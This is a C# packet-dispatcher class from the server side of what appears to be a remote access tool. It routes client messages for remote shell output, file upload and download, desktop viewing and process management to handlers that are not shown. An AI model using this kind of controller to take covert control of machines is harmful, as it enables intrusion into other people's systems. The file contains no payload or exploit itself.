using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using PacketLib;
using Server.Network;

namespace Server.Handlers
{
    internal class HandlePacket
    {
        public _Client _Client {  get; set; }
        public byte[] packet {  get; set; }
        public void Run(object state) 
        {
            if (packet == null) return;
            MsgUnpack msgUnpack = new MsgUnpack();
            msgUnpack.Unpack(packet);
            switch (msgUnpack.GetAsString("Packet"))
            {
                case "BasicInfo":
                    {
                        new HandleClient(_Client, msgUnpack);
                        break;
                    }
                case "Info":
                    {
                        new HandleInfo(_Client, msgUnpack);
                        break;
                    }
                case "ErrorLog":
                    {
                        string errorMsg = msgUnpack.GetAsString("Message");
                        errorMsg += "\nUID: " + msgUnpack.GetAsString("UID");
                        MessageBox.Show(errorMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        break;
                    }
                case "InfoLog":
                    {
                        string errorMsg = msgUnpack.GetAsString("Message");
                        errorMsg += "\nUID: " + msgUnpack.GetAsString("UID");
                        MessageBox.Show(errorMsg, "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        break;
                    }
                case "Ping":
                    {
                        Thread.Sleep(1500);
                        MsgPack msgPack = new MsgPack();
                        msgPack.Set("Packet", "Ping");
                        msgPack.Set("Message", "From server !");
                        _Client.Send(msgPack.Pack());
                        break;
                    }
                case "OutputShell":
                    {
                        new HandleShell(_Client, msgUnpack);
                        break;
                    }
                case "FileManager":
                    {
                        new HandleFileManager(_Client, msgUnpack);
                        break;
                    }
                case "Download":
                    {
                        new HandleDownload().Run(_Client, msgUnpack);
                        break;
                    }
                case "Upload":
                    {
                        new HandleUpload().Run(_Client, msgUnpack);
                        break;
                    }
                case "Editor":
                    {
                        new HandleEditor(_Client, msgUnpack);
                        break;
                    }
                case "Desktop":
                    {
                        new HandleDesktop().Run(_Client, msgUnpack);
                        break;
                    }
                case "ProcessManager":
                    {
                        new HandleProcessManager(_Client, msgUnpack);
                        break;
                    }
                default:
                    {
                        MessageBox.Show("Unknown Packet: " + msgUnpack.GetAsString("Packet"));
                        break;
                    }
            }
        }
    }
}
